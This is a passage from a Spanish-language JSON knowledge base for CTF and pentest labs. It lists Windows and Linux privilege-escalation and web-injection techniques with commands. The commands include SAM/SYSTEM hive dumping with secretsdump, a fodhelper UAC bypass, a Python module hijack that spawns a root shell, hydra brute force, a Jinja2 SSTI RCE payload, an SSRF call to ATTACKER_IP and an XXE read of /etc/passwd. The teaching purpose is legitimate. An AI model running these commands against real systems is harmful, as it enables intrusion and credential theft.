        "cuando": "En la enumeracion ([[enum-privesc-windows]]), en paralelo a los vectores de servicio/token. WinPEAS busca la mayoria automaticamente.",
        "necesitas": [
            "Una shell de usuario en Windows con acceso al filesystem y al registro.",
        ],
        "no_aplica": [
            "No hay ficheros de despliegue (unattend.xml), autologon ni credenciales cacheadas visibles.",
        ],
        "confirmacion": "findstr /si password sobre configs y reg query del autologon en Winlogon.",
        "resultado": "Una password en claro en un fichero de config, o DefaultPassword en el registro.",
        "senales": [
            "Ficheros unattend.xml / sysprep.xml / Autounattend.xml en el disco.",
            "cmdkey /list muestra credenciales cacheadas (runas /savecred).",
            "Autologon en el registro con DefaultPassword, o hives SAM/SYSTEM accesibles.",
        ],
        "pasos": [
            "Busca ficheros de despliegue con credenciales en claro o base64.",
            "Lista credenciales cacheadas con cmdkey; usa runas /savecred si hay.",
            "Revisa el registro (autologon, claves de apps) y volca SAM/SYSTEM si puedes.",
            "Cada credencial -> pruebala (reuse) o crackeala ([[cracking]]); un hash NTLM sirve para [[ntlm-pth]].",
        ],
        "commands": [
            {
                "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
                "why": "Si hay autologon configurado, la password del usuario queda en claro en el registro. Es un clasico de rooms Windows.",
                "out": "DefaultUserName y DefaultPassword en claro si existe. Esa credencial -> pruebala con runas o para RDP/WinRM; a menudo es de un usuario mas privilegiado.",
            },
            {
                "cmd": "findstr /si password *.xml *.ini *.txt *.config",
                "why": "Peina ficheros de configuracion y despliegue buscando 'password'. /s recursivo, /i sin distinguir mayusculas. Barato y muy rentable.",
                "out": "Lineas con credenciales y su fichero. unattend.xml suele traer la password del admin local (a veces en base64: decodificala).",
            },
        ],
    },
    {
        "id": "registry-autoruns",
        "title": "Autoruns y binarios de arranque",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Si un programa que arranca automaticamente con privilegios apunta a un binario que puedes escribir, lo reemplazas.",
        "que": "Windows ejecuta programas al inicio o al login desde varias claves de registro (Run, RunOnce) y carpetas de startup, a veces con privilegios altos. Si el binario referenciado es escribible por tu usuario, o la clave de registro es modificable, colocas tu ejecutable y correra con los privilegios del que dispara el autorun. Variante del [[winprivesc-modelo]].",
        "porque": "El software de terceros registra autoruns sin proteger bien los permisos del binario o de la clave. Si un admin inicia sesion (o el arranque es como SYSTEM), tu binario reemplazado se ejecuta con ese contexto.",
        "cuando": "En la enumeracion ([[enum-privesc-windows]]). WinPEAS y autorunsc listan los autoruns y marcan los que tienen permisos debiles.",
        "necesitas": [
            "Una shell de usuario en Windows con accesschk o permisos consultables.",
        ],
        "no_aplica": [
            "Ningun autorun referencia un binario escribible por tu usuario, y las claves de registro no son modificables.",
        ],
        "confirmacion": "accesschk sobre el binario referenciado por cada entrada de Run/RunOnce.",
        "resultado": "Un permiso de escritura (FILE_WRITE_DATA/W) para tu usuario o grupo sobre el .exe de autorun.",
        "senales": [
            "Un binario referenciado en una clave Run es escribible por tu usuario (accesschk).",
            "Una clave de registro de autorun modificable por ti.",
            "autorunsc marca un autorun con permisos flojos.",
        ],
        "pasos": [
            "Enumera autoruns (registro Run/RunOnce y carpetas startup).",
            "Comprueba permisos del binario y de la clave (accesschk).",
            "Reemplaza el binario escribible por tu payload (o apunta la clave al tuyo).",
            "Espera el proximo login/arranque del usuario privilegiado y recoge la ejecucion.",
        ],
        "commands": [
            {
                "cmd": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "why": "Lista los programas que arrancan con el sistema desde la clave Run de maquina. Son candidatos si el binario o la clave son escribibles.",
                "out": "Nombres y rutas de los binarios de autorun. Para cada uno, comprueba con accesschk si puedes escribir el .exe o modificar la clave.",
            },
            {
                "cmd": "accesschk.exe /accepteula -wvu \"C:\\ruta\\autorun.exe\"",
                "why": "Comprueba si tu usuario tiene permiso de escritura sobre el binario de autorun. Esa escritura es lo que te deja reemplazarlo por tu payload.",
                "out": "Permisos por usuario/grupo. Un FILE_WRITE_DATA/W para tu usuario o un grupo tuyo = puedes reemplazar el .exe. Si no, prueba modificar la clave de registro.",
            },
        ],
    },
    {
        "id": "dll-hijacking",
        "title": "Secuestro de DLL",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Una app privilegiada que busca una DLL en un directorio escribible carga la tuya: es el PATH hijacking de Windows.",
        "que": "Cuando un programa carga una DLL sin ruta absoluta, Windows la busca por un orden de directorios. Si un proceso privilegiado busca una DLL que no existe (o busca antes en un directorio donde puedes escribir), colocas ahi una DLL maliciosa con ese nombre y el proceso la carga y ejecuta tu codigo. Es el analogo Windows del [[path-hijacking]] de Linux.",
        "porque": "El orden de busqueda de DLLs incluye el directorio del ejecutable y otros; si la app no fija rutas y falta una DLL, el hueco es explotable. Tu DLL (con su DllMain) ejecuta el payload en el contexto del proceso, que puede ser SYSTEM.",
        "cuando": "Cuando un servicio o app privilegiada tiene una DLL ausente o cargable desde un directorio escribible. ProcMon (filtrando NAME NOT FOUND en .dll) lo revela.",
        "necesitas": [
            "ProcMon (o equivalente) para monitorizar cargas de DLL fallidas.",
            "Capacidad de compilar/subir una DLL (mingw en Kali o similar).",
        ],
        "no_aplica": [
            "Ningun proceso privilegiado busca una DLL en un directorio escribible por ti.",
        ],
        "confirmacion": "Filtra ProcMon por NAME NOT FOUND y Path ends with .dll mientras el proceso privilegiado corre.",
        "resultado": "Una ruta de DLL no encontrada en un directorio donde puedes escribir; tras colocar tu DLL, ejecucion en el contexto del proceso.",
        "senales": [
            "ProcMon muestra un proceso privilegiado con 'NAME NOT FOUND' buscando una .dll.",
            "El directorio donde busca la DLL es escribible por tu usuario.",
            "Una app de terceros que carga DLLs desde su propia carpeta escribible.",
        ],
        "pasos": [
            "Con ProcMon, caza DLLs que un proceso privilegiado busca y no encuentra.",
            "Confirma que puedes escribir en un directorio del orden de busqueda.",
            "Compila una DLL con ese nombre cuyo DllMain lance tu payload.",
            "Colocala y dispara/espera la carga; confirma la ejecucion privilegiada.",
        ],
        "commands": [
            {
                "cmd": "procmon.exe (filtro: Result is NAME NOT FOUND, Path ends with .dll)",
                "why": "ProcMon monitoriza en vivo que ficheros abre cada proceso. Filtrando DLLs no encontradas ves exactamente que hueco puedes rellenar con tu DLL.",
                "out": "Rutas de DLLs que un proceso busca sin exito. Si alguna esta en un directorio escribible por ti y el proceso es privilegiado, ese es tu vector.",
            },
            {
                "cmd": "x86_64-w64-mingw32-gcc pe.c -shared -o legit.dll",
                "why": "Compila (desde Kali) una DLL cuyo DllMain ejecuta tu payload al cargarse. El nombre debe coincidir con la DLL que el proceso busca.",
                "out": "El fichero legit.dll. Colocalo en el directorio donde el proceso la busca; al reiniciarse/cargarla, ejecuta tu codigo en su contexto (idealmente SYSTEM).",
            },
        ],
    },
    {
        "id": "sebackup-serestore",
        "title": "Privilegios SeBackup / SeRestore",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Estos privilegios saltan las ACL para leer/escribir cualquier fichero: volcas el SAM y sacas el hash del administrador.",
        "que": "SeBackupPrivilege permite leer cualquier fichero ignorando sus ACL (pensado para software de backup), y SeRestorePrivilege permite escribir cualquiera. Con SeBackup puedes copiar los hives SAM y SYSTEM del registro, llevartelos y extraer los hashes NTLM locales, incluido el del administrador. Caso concreto del [[winprivesc-modelo]] via privilegios de token.",
        "porque": "El privilegio existe para que las herramientas de copia lean ficheros bloqueados, pero no distingue backup legitimo de robo: si lo tienes, saltas todos los permisos NTFS. El SAM contiene los hashes locales; con ellos, [[ntlm-pth]] te da administrator sin crackear.",
        "cuando": "Cuando whoami /priv ([[enum-privesc-windows]]) muestra SeBackupPrivilege (habitual en el grupo Backup Operators).",
        "necesitas": [
            "whoami /priv mostrando SeBackupPrivilege o SeRestorePrivilege como Enabled.",
        ],
        "no_aplica": [
            "whoami /priv no muestra esos privilegios habilitados.",
        ],
        "confirmacion": "reg save de HKLM\\SAM y HKLM\\SYSTEM; si funciona sin error de acceso, el privilegio esta activo.",
        "resultado": "Dos ficheros .hive generados sin error; tras secretsdump, hashes NTLM locales incluido administrator.",
        "senales": [
            "whoami /priv lista SeBackupPrivilege / SeRestorePrivilege habilitado.",
            "Perteneces al grupo Backup Operators.",
        ],
        "pasos": [
            "Confirma SeBackup en whoami /priv.",
            "Copia los hives SAM y SYSTEM (via reg save o robocopy /b).",
            "Transfierelos a tu Kali y extrae los hashes con secretsdump.",
            "Usa el hash NTLM de administrator con [[ntlm-pth]] para shell como admin.",
        ],
        "commands": [
            {
                "cmd": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
                "why": "Con SeBackup puedes exportar los hives del registro que contienen los hashes locales (SAM) y la clave para descifrarlos (SYSTEM), saltando el bloqueo habitual.",
                "out": "Dos ficheros .hive. Baja ambos a tu Kali; el siguiente paso es extraer los hashes con impacket-secretsdump usando SAM + SYSTEM.",
            },
            {
                "cmd": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
                "why": "Extrae los hashes NTLM locales combinando SAM y SYSTEM. Es el paso que convierte los hives robados en credenciales usables.",
                "out": "Lineas usuario:rid:lm:nt. El NT hash de Administrator -> [[ntlm-pth]] con evil-winrm/psexec para shell como admin sin crackear.",
            },
        ],
    },
    {
        "id": "uac-bypass",
        "title": "Bypass de UAC",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Ya eres admin pero con token limitado; un bypass de UAC eleva a integridad alta sin el prompt de consentimiento.",
        "que": "El Control de Cuentas de Usuario (UAC) hace que, aunque tu usuario sea administrador, ejecutes con un token de integridad media hasta que confirmas la elevacion. Un bypass de UAC aprovecha binarios de Windows que auto-elevan sin pedir consentimiento para lanzar un proceso con integridad alta (admin completo) sin el prompt.",
        "porque": "Ciertos ejecutables firmados de Microsoft se auto-elevan y leen configuracion del registro de usuario; si secuestras esa clave (fodhelper, eventvwr), Windows lanza tu comando elevado. No es cruzar de usuario a admin, sino de 'admin a medias' a 'admin completo'.",
        "cuando": "Cuando whoami /groups muestra que estas en Administrators pero con integridad media (no puedes tocar recursos protegidos aun). No aplica si ya eres SYSTEM o integridad alta.",
        "necesitas": [
            "Ser miembro del grupo Administrators con nivel de integridad Medium.",
        ],
        "no_aplica": [
            "Tu usuario no esta en Administrators (esto no es una escalada de usuario a admin, solo de admin-medio a admin-alto).",
            "Ya tienes integridad High/System.",
        ],
        "confirmacion": "whoami /groups | findstr Label para ver tu nivel de integridad actual.",
        "resultado": "'Mandatory Label\\Medium'; tras el bypass, un proceso con integridad High ejecutando tu comando.",
        "senales": [
            "Estas en el grupo Administrators pero el nivel de integridad es Medium.",
            "Operaciones de admin fallan con acceso denegado pese a ser admin.",
        ],
        "pasos": [
            "Confirma que eres admin con integridad media (whoami /groups).",
            "Elige una tecnica segun la build (fodhelper, eventvwr, computerdefaults).",
            "Secuestra la clave de registro correspondiente para que apunte a tu comando.",
            "Dispara el binario auto-elevado; tu comando corre con integridad alta.",
        ],
        "commands": [
            {
                "cmd": "whoami /groups | findstr /i \"Label\"",
                "why": "Muestra tu nivel de integridad (Mandatory Label). Distingue si necesitas bypass de UAC (Medium) o si ya tienes admin completo (High).",
                "out": "'Mandatory Label\\Medium' = necesitas UAC bypass. 'High' = ya elevado, no hace falta. Junto con el grupo Administrators define si aplica.",
            },
            {
                "cmd": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f",
                "why": "Prepara el secuestro de fodhelper: al ejecutarse (auto-elevado), lee esta clave de usuario y lanza tu comando con integridad alta, sin prompt de UAC.",
                "out": "Tras esto, ejecutar fodhelper.exe abre un cmd elevado (integridad High). Ajusta la tecnica/clave a la build de Windows; limpia la clave despues.",
            },
        ],
    },
    {
        "id": "kernel-exploits-windows",
        "title": "Exploits de kernel en Windows (ultimo recurso)",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Si faltan parches, un exploit local eleva a SYSTEM; deja esto para el final por inestabilidad.",
        "que": "Un exploit de kernel de Windows aprovecha un fallo en el nucleo o en un driver para ejecutar codigo como SYSTEM desde un usuario normal. Aplica cuando faltan parches concretos (MS16-032, PrintNightmare, etc.). Se identifican comparando los hotfixes instalados con los CVE conocidos.",
        "porque": "Como en Linux, se dejan para el FINAL: pueden inestabilizar o tumbar la maquina, y casi siempre hay un vector de config mas limpio. Solo cuando la enumeracion ([[enum-privesc-windows]]) no dio token, servicio ni credencial se recurre a esto.",
        "cuando": "Cuando ningun vector de config funciono y systeminfo revela un Windows con pocos parches. Watson/wesng cruzan los hotfixes con exploits conocidos.",
        "necesitas": [
            "Version y hotfixes exactos (systeminfo).",
        ],
        "no_aplica": [
            "El sistema esta al dia de parches para los CVEs conocidos.",
            "Quedan vectores de configuracion sin probar (token, servicios, credenciales): prueba esos primero.",
        ],
        "confirmacion": "Pasa systeminfo por wesng/Watson y compara con los KB instalados.",
        "resultado": "Un CVE de Elevation of Privilege sin el KB correspondiente instalado.",
        "senales": [
            "systeminfo muestra pocos hotfixes o un build viejo.",
            "Watson/wesng sugieren exploits aplicables a esa build.",
            "Servicios de impresion vulnerables (PrintNightmare) presentes.",
        ],
        "pasos": [
            "Saca version y parches con systeminfo.",
            "Pasa la salida por wesng/Watson para candidatos.",
            "Elige uno, leelo ([[explotar-cve]]) y consigue el binario compilado fiable.",
            "Ejecuta con cuidado; confirma SYSTEM. Si falla o cuelga, vuelve a los vectores de config.",
        ],
        "commands": [
            {
                "cmd": "systeminfo > sysinfo.txt",
                "why": "Captura version, build y hotfixes. Es la entrada para las herramientas que sugieren que exploit de kernel aplica a esta maquina.",
                "out": "OS version/build y lista de KB. Guardalo y pasalo por wesng: te dara CVEs sin parchear con exploit publico.",
            },
            {
                "cmd": "python wesng.py sysinfo.txt",
                "why": "Windows Exploit Suggester cruza tu systeminfo con la base de vulnerabilidades y lista exploits candidatos ordenados por relevancia.",
                "out": "Lista de CVE/MS con enlace al exploit. Prioriza los de 'Elevation of Privilege' con PoC; leelo antes de ejecutar ([[explotar-cve]]).",
            },
        ],
    },
    {
        "id": "fuerza-bruta-online",
        "title": "Fuerza bruta a logins (online)",
        "phase": "access",
        "section": "credenciales-y-acceso",
        "summary": "Probar muchas credenciales contra un login vivo (ssh, ftp, un panel web) con hydra, sin crackear nada offline.",
        "que": "La fuerza bruta online lanza intentos de login reales contra un servicio en marcha, probando usuarios y passwords de un diccionario hasta que uno entra. A diferencia del [[cracking]] (que trabaja offline sobre un hash), aqui atacas el servicio directamente: cada intento es una conexion de verdad. La herramienta estandar es hydra.",
        "porque": "Muchos logins usan passwords debiles o por defecto y no limitan los intentos. Si tienes un usuario valido (o una lista) y un buen diccionario, probar en automatico es mas rapido que a mano. La clave del ataque web es que hydra necesita saber distinguir un fallo de un acierto, y eso se lo das tu con el mensaje de error.",
        "cuando": "Cuando hay un servicio de login accesible (ssh, ftp, smb, un formulario web) y no tienes credenciales, o tienes un usuario pero no su password. No lo uses a lo loco en AD: el spraying agresivo bloquea cuentas.",
        "no_aplica": [
            "El servicio bloquea la cuenta tras pocos intentos (rate limiting agresivo o lockout).",
            "No tienes ningun usuario valido ni forma de enumerarlos.",
        ],
        "confirmacion": "Lanza hydra contra un unico usuario conocido con un diccionario pequeno antes de escalar.",
        "resultado": "Una linea '[PUERTO][protocolo] host: ... login: ... password: ...' al acertar.",
        "necesitas": [
            "Un servicio de login accesible: ssh, ftp, smb, o un formulario web.",
            "Al menos un usuario, o una lista users.txt (sacala de enum: [[smb-enum]], la web, OSINT).",
            "Un diccionario de passwords (rockyou.txt cubre la mayoria de rooms).",
            "Para un login WEB: el metodo (GET/POST), los nombres exactos de los campos usuario/password, y el mensaje EXACTO que sale al fallar (hydra lo usa para saber que un intento fallo).",
        ],
        "senales": [
            "Hay un panel de login, un ssh o un ftp expuesto y no tienes con que entrar.",
            "Enum te dio usuarios validos pero no sus passwords.",
            "El login no parece limitar intentos ni tener captcha.",
        ],
        "pasos": [
            "Consigue el/los usuario(s) y elige el diccionario.",
            "Para un servicio directo (ssh/ftp) apunta hydra al modulo correspondiente.",
            "Para un login web, captura la peticion (Burp/DevTools): metodo, campos y el mensaje de fallo; montalos en http-post-form.",
            "Lanza, valida el primer acierto a mano, y esa credencial -> reutilizala en todo ([[cracking]] cubre el reuse).",
        ],
        "commands": [
            {
                "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP ssh",
                "why": "Fuerza bruta directa contra ssh: -l usuario fijo, -P diccionario. Para servicios con protocolo propio (ssh/ftp/smb) hydra ya sabe cuando un login funciona, no hace falta mensaje de fallo.",
                "out": "Una linea '[22][ssh] host: ... login: admin password: ...' cuando acierta. Si va lentisimo o bloquea, baja hilos con -t 4. Nada = usuario o diccionario equivocados.",
            },
            {
                "cmd": "hydra -l admin -P rockyou.txt $IP http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"",
                "why": "Login web por POST. La cadena tiene 3 partes separadas por ':' -> ruta, cuerpo con ^USER^/^PASS^, y la condicion de fallo F=texto. Sin la F correcta, hydra marca todo como valido.",
                "out": "El par usuario:password que NO dispara el mensaje de fallo. Si TODO sale como valido, tu F= no coincide con el mensaje real: copialo exacto de la respuesta. Usa S= si prefieres marcar el exito.",
            },
        ],
    },
    {
        "id": "python-library-hijacking",
        "title": "Python library hijacking",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Un script Python que corre como root importa un modulo; si puedes escribir ese modulo (o uno que Python busque antes), tu codigo corre como root.",
        "que": "Cuando un script de Python que se ejecuta como root hace 'import modulo', Python busca ese modulo recorriendo una lista de directorios (sys.path) en orden. Si puedes colocar un fichero .py con ese nombre en un directorio que se busque ANTES que el modulo real, o sobrescribir el propio modulo, tu codigo se ejecuta con privilegios de root al importarse. Es el [[path-hijacking]] aplicado al sistema de imports de Python.",
        "porque": "sys.path incluye, y normalmente en primer lugar, el directorio del propio script; ademas de PYTHONPATH y los site-packages. El programador confia en que se importara el modulo legitimo, pero Python simplemente coge el primero que encuentra. Si el directorio del script es escribible, o el modulo importado lo es, o sudo conserva PYTHONPATH, rompes esa confianza. Misma logica que el [[privesc-modelo]].",
        "cuando": "Cuando puedes ejecutar un script Python como root (via [[sudo-abuse]]) o un cron root lo ejecuta, Y puedes escribir uno de los sitios donde Python busca sus modulos. Es un vector muy comun en rooms de escalada Linux.",
        "no_aplica": [
            "El script root no hace ningun 'import' de un modulo no estandar.",
            "Todos los directorios de sys.path anteriores al modulo real son de solo-lectura para ti.",
        ],
        "confirmacion": "Revisa sys.path y los permisos de cada directorio anterior al modulo real que importa el script.",
        "resultado": "Un directorio escribible por ti apareciendo ANTES del modulo legitimo en sys.path.",
        "necesitas": [
            "Un script Python que corre como root (sudo -l con un .py, o un cron).",
            "Que el script haga 'import <algo>' de un modulo (idealmente no estandar).",
            "Poder ESCRIBIR uno de: el directorio del script, el fichero del modulo importado, un directorio que aparezca antes en sys.path, o controlar PYTHONPATH (sudo env_keep).",
        ],
        "senales": [
            "sudo -l te deja ejecutar un script .py como root.",
            "El directorio del script (o un modulo que importa) es escribible por tu usuario.",
            "El script hace 'import' de un modulo con nombre poco comun que vive junto a el.",
            "sudo -l muestra env_keep+=PYTHONPATH.",
        ],
        "pasos": [
            "Lee el script root e identifica que modulos importa.",
            "Mira sys.path y los permisos: ¿puedes escribir el dir del script, el modulo, o un dir que preceda al real?",
            "Crea un fichero con el nombre del modulo importado que ejecute tu payload (os.setuid(0) + shell).",
            "Ejecuta el script como root; al importar tu modulo, corre como root. Confirma con id (uid=0).",
        ],
        "commands": [
            {
                "cmd": "sudo -l",
                "why": "Punto de partida: ver si puedes ejecutar un script .py como root. Una entrada NOPASSWD sobre un python es el candidato tipico de este vector.",
                "out": "Lineas '(root) NOPASSWD: /usr/bin/python3 /ruta/script.py'. Abre y lee ese script: te dice que modulos importa y donde vive.",
            },
            {
                "cmd": "python3 -c 'import sys; print(sys.path)'",
                "why": "Muestra el orden en que Python busca modulos. El primer directorio escribible que preceda al modulo real es tu hueco para inyectar.",
                "out": "Lista de directorios. Si el dir del script (o '' = dir actual) va primero y es escribible, tienes hijacking directo. Cruza esto con los permisos.",
            },
            {
                "cmd": "echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo.py",
                "why": "Crea un modulo malicioso con el MISMO nombre que el que importa el script. Al ejecutarse el script como root, importa el tuyo y ejecuta tu codigo con uid 0.",
                "out": "Al lanzar 'sudo python3 /ruta/script.py', obtienes una shell root (id = uid=0). Ajusta el nombre del fichero al modulo exacto que importa el script.",
            },
        ],
    },
    {
        "id": "ssti",
        "title": "Server-Side Template Injection (SSTI)",
        "phase": "enumeration",
        "section": "web-inyecciones",
        "summary": "Tu entrada se evalua como codigo de plantilla en vez de mostrarse como texto; segun el motor, eso llega a ejecucion de comandos.",
        "que": "Muchas apps meten tu entrada dentro de una plantilla (Jinja2, Twig, Freemarker...) para generar HTML dinamico. Si el motor de plantillas EVALUA tu entrada en vez de solo insertarla como texto, puedes inyectar sintaxis de la propia plantilla. Segun el motor, eso escala desde leer variables internas hasta ejecutar comandos del sistema.",
        "porque": "El programador hace algo como render_template_string('Hola ' + nombre) en vez de pasar nombre como variable separada. El motor no distingue 'tu texto' de 'codigo de plantilla que debo evaluar', igual que en [[sqli]] o [[command-injection]] la app no distingue dato de instruccion.",
        "cuando": "Cuando tu entrada aparece reflejada en la pagina Y el backend usa un motor de plantillas (Jinja2/Python, Twig/PHP, Freemarker o Velocity/Java, ERB/Ruby). Sospecha en campos de nombre, mensajes, plantillas de email o generacion de PDF/HTML.",
        "necesitas": [
            "Un campo cuyo valor se refleje en el HTML de la respuesta.",
            "Saber (o poder deducir) el motor de plantillas del backend para usar la sintaxis correcta.",
        ],
        "no_aplica": [
            "Tu entrada se refleja pero SIN evaluar (aparece literal {{7*7}} en el HTML): es solo XSS/reflexion, no SSTI.",
            "La app no usa motor de plantillas (renderiza HTML estatico o via un framework que sanea siempre).",
        ],
        "confirmacion": "Manda una operacion matematica como payload ({{7*7}}, ${7*7} o <%= 7*7 %> segun sospeches el motor) en el campo reflejado.",
        "resultado": "La respuesta muestra 49 en vez del texto literal. Eso confirma que el motor esta EVALUANDO tu entrada, no solo mostrandola.",
        "senales": [
            "El campo se refleja en la respuesta tal cual lo mandas.",
            "Mensajes de error que mencionan Jinja2, Twig, Freemarker, Velocity o un motor de plantillas concreto.",
            "{{7*7}} (o el payload equivalente del motor) se convierte en 49 en la respuesta.",
        ],
        "pasos": [
            "Confirma con una operacion matematica minima ({{7*7}}) antes de nada mas.",
            "Identifica el motor exacto: cada uno tiene payloads de deteccion distintos (Jinja2 vs Twig vs Freemarker dan resultados diferentes a la misma sintaxis).",
            "Una vez identificado, escala con el payload de RCE especifico del motor (en Jinja2, via __class__.__init__.__globals__ hasta llegar a os.popen).",
            "Con ejecucion de comandos, confirma con id y salta a conseguir shell: mira [[reverse-vs-bind]].",
        ],
        "commands": [
            {
                "cmd": "curl -sS \"$URL/?name={{7*7}}\"",
                "why": "Prueba de confirmacion minima para Jinja2/Twig-style. Si el motor evalua, 49 aparece en la respuesta; si no, veras el texto literal.",
                "out": "Un '49' en la respuesta HTML confirma SSTI. Si no cambia nada, prueba otras sintaxis: ${7*7} (Freemarker/Velocity) o <%= 7*7 %> (ERB).",
            },
            {
                "cmd": "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
                "why": "Payload de escalada especifico de Jinja2/Flask: navega desde un objeto de config accesible hasta el modulo os para ejecutar comandos.",
                "out": "La salida de id (uid=... gid=...) en la respuesta confirma RCE completo, no solo evaluacion de expresiones.",
            },
        ],
    },
    {
        "id": "ssrf",
        "title": "Server-Side Request Forgery (SSRF)",
        "phase": "enumeration",
        "section": "web-inyecciones",
        "summary": "Consigues que el SERVIDOR haga una peticion HTTP a la URL que tu eliges, alcanzando redes internas que tu no ves directamente.",
        "que": "Un SSRF ocurre cuando la app acepta una URL (para descargar un avatar, verificar un webhook, importar un fichero remoto...) y el SERVIDOR la solicita el mismo. Si controlas esa URL, el servidor se convierte en tu proxy: puedes hacerle pedir localhost, la red interna, o metadatos de la nube, cosas a las que tu no llegas directamente.",
        "porque": "El programador confia en que la URL apuntara a un recurso externo legitimo (una imagen, un webhook real) y no valida ni restringe el destino. El servidor, al estar dentro de la red interna, ve cosas que tu Kali no ve desde fuera.",
        "cuando": "Cuando un parametro pide una URL, un dominio, o algo que 'importa' o 'verifica' un recurso remoto: url, webhook, avatar, import, callback, feed. Muy comun tambien en generadores de PDF que renderizan una URL.",
        "necesitas": [
            "Un parametro que haga que el SERVIDOR (no tu navegador) solicite una URL.",
            "Un listener propio (python3 -m http.server) para confirmar sin ambiguedad antes de apuntar a localhost/red interna.",
        ],
        "no_aplica": [
            "La app valida el destino contra una lista blanca de dominios permitidos, sin excepciones.",
            "La 'URL' en realidad solo se usa para mostrar un enlace en el cliente, nunca la solicita el servidor.",
        ],
        "confirmacion": "Apunta el parametro a tu propio listener (python3 -m http.server 8000) antes de probar localhost o la red interna.",
        "resultado": "Una peticion entrante en tu listener HTTP. Eso confirma que el servidor SI solicita URLs que tu controlas.",
        "senales": [
            "Un parametro llamado url, webhook, avatar, import, feed o callback.",
            "La app describe una funcion de 'importar desde URL' o 'verificar disponibilidad'.",
            "Tu listener recibe la peticion cuando apuntas el parametro a tu IP.",
        ],
        "pasos": [
            "Confirma SIEMPRE contra tu propio listener primero, nunca contra localhost/metadata directamente.",
            "Una vez confirmado, prueba destinos internos: 127.0.0.1 con distintos puertos, rangos internos tipicos, o el endpoint de metadatos de la nube (169.254.169.254) si el contexto es cloud.",
            "Si la respuesta refleja el contenido obtenido (SSRF 'visible'), lees directamente lo que hay en el destino interno.",
            "Si no refleja nada (SSRF 'ciega'), solo sabes que respondio o no; usa temporizacion o un servicio out-of-band para confirmar.",
        ],
        "commands": [
            {
                "cmd": "python3 -m http.server 8000",
                "why": "Levanta un listener propio para confirmar el SSRF sin ambiguedad: si te llega la peticion, sabes con certeza que el servidor sigue URLs que tu controlas.",
                "out": "El listener queda a la escucha. Combinalo con el siguiente comando para disparar la peticion desde el servidor.",
            },
            {
                "cmd": "curl -sS \"$URL/fetch?url=http://ATTACKER_IP:8000/\"",
                "why": "Dispara el SSRF apuntando al tu propio listener. Es la prueba minima y segura antes de tocar localhost o redes internas.",
                "out": "Una peticion GET registrada en tu `python3 -m http.server`. Confirmado esto, repite el mismo parametro apuntando a 127.0.0.1 o al rango interno.",
            },
        ],
    },
    {
        "id": "xxe",
        "title": "XML External Entity (XXE)",
        "phase": "enumeration",
        "section": "web-inyecciones",
        "summary": "Un parser XML mal configurado resuelve entidades externas que tu defines, dejandote leer ficheros del servidor o hacer peticiones salientes.",
        "que": "XML permite definir 'entidades' (variables de texto) en un DOCTYPE, incluidas entidades que cargan contenido EXTERNO (un fichero local o una URL). Si la app procesa XML que tu controlas y el parser no desactiva esas entidades externas, defines una que apunte a /etc/passwd y el parser te devuelve su contenido.",
        "porque": "Muchos parsers XML traen la resolucion de entidades externas activada POR DEFECTO por compatibilidad, y el programador no la desactiva explicitamente. El parser confia en que el XML que procesa es de confianza, pero si TU controlas el XML de entrada, controlas sus entidades.",
        "cuando": "Solo aplica cuando la app procesa XML que tu controlas: subida de ficheros XML/SVG/DOCX/XLSX, SOAP, SAML, o cualquier import que acepte XML. No aplica si la app solo usa JSON.",
        "necesitas": [
            "Un punto de entrada que acepte XML (o un formato basado en XML: SVG, SOAP, SAML, DOCX/XLSX).",
            "El parser del backend con resolucion de entidades externas activada (no siempre lo esta en librerias modernas).",
        ],
        "no_aplica": [
            "La app solo acepta JSON o no procesa XML en ningun punto de entrada.",
            "El parser tiene DTD/entidades externas desactivadas (comportamiento por defecto en muchas librerias modernas parcheadas).",
        ],
        "confirmacion": "Sube un XML con una entidad que apunte a un fichero que sepas que existe (file:///etc/passwd) y mira si el contenido vuelve reflejado.",
        "resultado": "El contenido de /etc/passwd aparece en la respuesta (XXE 'visible'). Si no se refleja nada, intenta un XXE ciego (out-of-band) apuntando la entidad a tu propio listener HTTP.",
        "senales": [
            "La app acepta subida o entrada de XML, SVG, SOAP, SAML o documentos Office (DOCX/XLSX usan XML internamente).",
            "El fichero XML que subes se procesa (parsea) en vez de guardarse tal cual.",
            "Errores de parser XML visibles en la respuesta ante un XML malformado.",
        ],
        "pasos": [
            "Confirma que el punto de entrada acepta y PROCESA XML (no solo lo almacena).",
            "Prueba una entidad local inocua (file:///etc/passwd en tu lab) para ver si se refleja el contenido.",
            "Si no hay reflexion, monta un XXE ciego: la entidad apunta a tu servidor HTTP/DNS y confirmas por el callback que llega.",
            "Con lectura de ficheros confirmada, busca configs con credenciales o claves SSH del servidor.",
        ],
        "commands": [
            {
                "cmd": "printf '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' > xxe.xml",
                "why": "Construye el XML minimo: declara una entidad externa 'xxe' que apunta a un fichero local, y la referencia dentro del documento.",
                "out": "El fichero xxe.xml listo para enviar. El contenido de /etc/passwd deberia sustituir a &xxe; si el parser resuelve la entidad.",
            },
            {
                "cmd": "curl -sS -X POST $URL/upload --data-binary @xxe.xml -H 'Content-Type: application/xml'",
                "why": "Envia el XML malicioso al endpoint que lo procesa. El Content-Type application/xml asegura que el servidor lo trate como XML y no como texto plano.",
                "out": "Si el parser es vulnerable, la respuesta contiene las lineas de /etc/passwd (root:x:0:0...) en vez de procesar el documento normalmente.",
            },
        ],
    },
    {
        "id": "idor-bola",
        "title": "IDOR / Broken Object Level Authorization (BOLA)",
        "phase": "enumeration",
        "section": "web-apis-y-autorizacion",
